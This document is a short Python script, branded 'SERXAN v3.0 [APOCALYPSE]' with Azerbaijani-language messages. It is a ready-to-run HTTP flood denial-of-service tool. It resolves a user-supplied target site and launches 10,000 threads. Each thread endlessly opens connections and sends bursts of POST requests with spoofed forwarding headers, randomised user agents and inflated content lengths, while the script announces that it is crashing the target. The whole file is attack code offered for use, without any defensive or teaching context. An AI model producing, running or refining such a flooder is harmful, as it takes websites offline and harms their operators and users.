import socket, threading, random, os, time, ssl, sys
def serxan_banner():
    print("""\033[1;31m
     _______  _______  ______   __   _  _______  __    _ 
    |  _____||  _____||  __  \ |  | / /|  ___  ||  \  | |
    | |____  | |____  | |__|  ||  |/ / | |___| ||   \ | |
    |____  | |  ____| |      / |     \ |  ___  || |\  \| |
     ____| | | |_____ |  |\  \ |  |\  \| |   | || | \    |
    |_______||_______||__| \__\|__| \__\_|   |_||_|  \___|
    [+]----------------------------------------------[+]
    [|]  LAYİHƏ: SERXAN v3.0 [APOCALYPSE]            [|]
    [|]  STATUS: MAKSİMUM DAĞIDICI GÜC               [|]
    [+]----------------------------------------------[+]
    \033[0m""")
def get_deadly_payload(host):
    ver = f"{random.randint(50, 110)}.0.{random.getrandbits(12)}"
    ips = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    headers = [f"POST /?{random.getrandbits(32)} HTTP/1.1", f"Host: {host}", f"User-Agent: Mozilla/5.0 Chrome/{ver}", f"X-Forwarded-For: {ips}", f"Content-Length: {random.randint(10000, 50000)}", "Connection: Keep-Alive", "\r\n"]
    return "\r\n".join(headers).encode()
def apocalypse_strike(ip, port, host):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == 443: s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            s.connect((ip, port))
            for _ in range(150): s.sendall(get_deadly_payload(host))
            s.close()
        except: pass
if __name__ == "__main__":
    os.system("clear"); serxan_banner()
    target = sys.argv[1] if len(sys.argv) > 1 else input("Hədəf sayt: ").replace("https://","").replace("http://","").split("/")[0]
    try:
        ip = socket.gethostbyname(target)
        port = 443 if socket.socket().connect_ex((ip, 443)) == 0 else 80
        print(f"[*] Hədəf: {target} | IP: {ip} | Port: {port}\n[*] 10,000 Xətt Başladılır...")
        for _ in range(10000): threading.Thread(target=apocalypse_strike, args=(ip, port, target), daemon=True).start()
        while True: print(f"\r\033[1;91m[☢️] SERXAN AKTİVDİR: {target} SİSTEMİ ÇÖKDÜRÜLÜR... \033[0m", end=""); time.sleep(1)
    except: print("Xəta baş verdi!")
